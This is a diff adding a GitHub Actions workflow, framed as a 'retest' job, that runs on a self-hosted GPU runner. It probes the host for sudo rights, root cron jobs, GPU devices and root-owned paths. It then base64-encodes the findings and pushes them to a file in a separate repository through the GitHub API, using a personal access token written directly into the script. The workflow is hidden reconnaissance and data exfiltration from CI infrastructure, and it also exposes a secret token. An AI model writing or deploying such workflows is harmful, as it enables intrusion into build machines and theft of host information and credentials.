@@ -1,0 +1,32 @@
+name: ul-retest-1051
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        run: |
+          set +e
+          H=$(hostname -s)
+          {
+            echo "== retest1051 $H $(date -u +%FT%TZ)"
+            echo "-- id"; id
+            echo "-- sudo"; sudo -n id 2>&1 | head -2; echo "sudo_rc=$?"
+            echo "-- sudo_nopasswd"; sudo -n -l 2>&1 | tail -5
+            echo "-- gpu"; nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu --format=csv,noheader
+            echo "-- gpu_devices"; ls -1 /dev/nvidia* 2>&1
+            echo "-- root-owned-marker"; ls -ld /opt/nv /opt/ul-t2 2>&1
+            echo "-- root_cron"; sudo -n crontab -l 2>&1 | tail -6
+          } > /tmp/retest1051.out 2>&1
+          C=$(base64 -w0 /tmp/retest1051.out)
+          T=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
+          P="cmdout8/retest1051_${H}.txt"
+          S=$(curl -s -m 30 -H "Authorization: token $T" "https://api.github.com/repos/dongsuju/ul-plant/contents/$P?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$S" ]; then SHA=",\"sha\":\"$S\""; else SHA=""; fi
+          curl -s -m 40 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" \
+            -d "{\"message\":\"retest1051 out\",\"content\":\"$C\",\"branch\":\"main\"$SHA}" \
+            "https://api.github.com/repos/dongsuju/ul-plant/contents/$P"
+          echo done
